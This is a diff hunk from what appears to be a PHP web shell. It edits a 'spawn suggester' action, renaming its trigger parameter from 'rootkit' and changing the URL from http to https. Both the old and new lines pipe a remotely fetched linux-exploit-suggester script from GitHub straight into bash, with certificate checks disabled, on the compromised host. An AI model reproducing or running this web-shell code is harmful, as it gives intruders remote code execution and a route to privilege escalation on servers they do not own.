@@ -2083,8 +2083,8 @@ if($s_auth){
 	}
 
 	// spawn suggester
-	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='rootkit')){
-		$s_result .= "<pre><code>".exe("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash")."</code></pre>";
+	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='suggester')){
+		$s_result .= "<pre><code>".exe("curl -Lsk https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash")."</code></pre>";
 	}
 
 	// spawn adminer
